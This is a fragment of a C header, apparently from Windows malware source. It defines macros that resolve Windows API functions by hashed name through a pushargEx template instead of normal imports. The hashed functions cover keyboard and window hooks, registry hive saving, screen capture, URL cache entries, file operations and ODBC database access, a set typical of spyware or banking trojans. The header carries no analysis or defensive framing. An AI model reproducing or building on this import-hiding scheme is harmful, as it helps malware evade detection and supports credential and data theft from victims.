...
#define DLL_PSAPI		18	/*psapi.dll*/
#define DLL_SHLWAPI		19  /*shlwapi.dll*/
#define DLL_IPHLPAPI	20  /*Iphlpapi.dll*/
#define WINSPOOL_DRV	21  /*winspool_drv*/
#define COMANDLG32_DLL	22  /*commdlg32_dll*/
#define ODBC32_DLL		23  /*odbc32_dll*/
...
#define pDisconnectNamedPipe   		pushargEx<1,0x46C6B01F>
...
#define pFileTimeToSystemTime		pushargEx<1, 0x3B429F5F>
#define pCompareFileTime			pushargEx<1, 0x41C9C8F5>
#define pSystemTimeToFileTime		pushargEx<1, 0xEA7EA921>
#define pGetLogicalDriveStringsA  	pushargEx<1, 0x70F6FE31>
#define pGetDriveTypeA          	pushargEx<1, 0x399354CE>
#define pSleepEx				 	pushargEx<1, 0x5CBD6D9E>
#define pGetProcessId				pushargEx<1, 0x0e91a280>
#define pOpenEventA					pushargEx<1, 0x9C700049>
...
#define pGetExitCodeThread			pushargEx<1, 0x4E5A10B1>
#define pGetCommandLineA			pushargEx<1, 0xFB0730C>
#define pGetPrivateProfileIntA		pushargEx<1,0x11CC0678>
#define pGetPrivateProfileStringA	pushargEx<1,0xAA19E291>
...
#define pRegSaveKeyA				pushargEx<2,0xBEDEEFC5>
#define pRegSaveKeyW				pushargEx<2,0xBEDEEFD3>
#define pRegSaveKeyExA				pushargEx<2,0xBBF053F6>
#define pRegSaveKeyExW				pushargEx<2,0xBBF053E0>
...
#define pIsWindowUnicode            pushargEx<3,0x6EE99F86>
...
#define pLoadCursorA    			pushargEx<3,0xCFB2E5D9>
...
#define pCallWindowProcA		   	pushargEx<3,0xEE5FDA87>
#define pCallWindowProcW			pushargEx<3,0xEE5FDA91>
#define pSetTimer       			pushargEx<3,0x4D9CE557>
#define pDestroyWindow      		pushargEx<3,0xEB4A6DB3>
#define pGetFocus           		pushargEx<3,0x6D776D57>
#define pCharLowerBuffA        		pushargEx<3,0x5FDA1871>
#define pCharUpperBuffA        		pushargEx<3,0xC0D4187D>
#define pwvsprintfA 				pushargEx<3,0x6B3AF0EC>
#define pSetWindowsHookExA 			pushargEx<3,0xB4584DDA>
#define pSetWindowsHookExW 			pushargEx<3,0xB4584DCC>
#define pUnhookWindowsHookEx 		pushargEx<3,0xB800C8A6>
#define pSetWindowTextA 			pushargEx<3,0x3C29100A>
#define pSetWindowTextW 			pushargEx<3,0x3C29101C>
#define pSetWindowLongPtrA			pushargEx<3,0x334A94D2>
#define pSetWindowLongPtrW			pushargEx<3,0x334A94C4>
#define pScreenToClient				pushargEx<3,0xBDAE901A>
#define pGetClientRect				pushargEx<3,0xA2F65BA2>
#define pGetDlgItem					pushargEx<3,0x9CD421A8>
#define pCallNextHookEx				pushargEx<3,0x8616AB9B>
#define pGetCursor					pushargEx<3,0x199725ED>
#define pSetCursor					pushargEx<3,0xD9725ED>
#define pGetAncestor			 	pushargEx<3,0xAAFE9D1E>
#define pRegisterWindowMessageA	 	pushargEx<3,0xE5D2B59>
#define pFindWindowA	        	pushargEx<3,0x252B53B>
#define pGetDC			        	pushargEx<3,0x7CBD2247>
#define pGetClassLongA	        	pushargEx<3,0x2544C17C>
#define pPrintWindow	        	pushargEx<3,0xF404F170>
#define pGetWindowPlacement	       	pushargEx<3,0xE06982CE>
#define pIsIconic			       	pushargEx<3,0x3D687AAD>
...
#define pSHFileOperationA			pushargEx<7,0x8B6D020B>
#define pSHFileOperationW			pushargEx<7,0x8B6D021D>
...
#define pGetUrlCacheEntryInfoA 		pushargEx<8,0x57FBC0DD>
...
#define pCreateUrlCacheEntryA		pushargEx<8,0x10815BF5>
#define pCommitUrlCacheEntryA		pushargEx<8,0x548D61B6>
...
//odbc32
#define pSQLAllocHandle				pushargEx<ODBC32_DLL,0xEC1F2857>
#define pSQLSetEnvAttr				pushargEx<ODBC32_DLL,0x88EE1E2C>
#define pSQLConnectA				pushargEx<ODBC32_DLL,0x203F51DF>
#define pSQLDriverConnectA			pushargEx<ODBC32_DLL,0x3941DBB7>
#define pSQLPrepareA				pushargEx<ODBC32_DLL,0xC09D6D06>
#define pSQLBindCol					pushargEx<ODBC32_DLL,0x3D09FC8B>
#define pSQLExecute					pushargEx<ODBC32_DLL,0x8DE46D8A>
#define pSQLFetch					pushargEx<ODBC32_DLL,0x6C1A778C>
#define pSQLCloseCursor				pushargEx<ODBC32_DLL,0xACA2F119>
#define pSQLFreeHandle				pushargEx<ODBC32_DLL,0x6A289300>
#define pSQLDisconnect				pushargEx<ODBC32_DLL,0x8104CDA8>
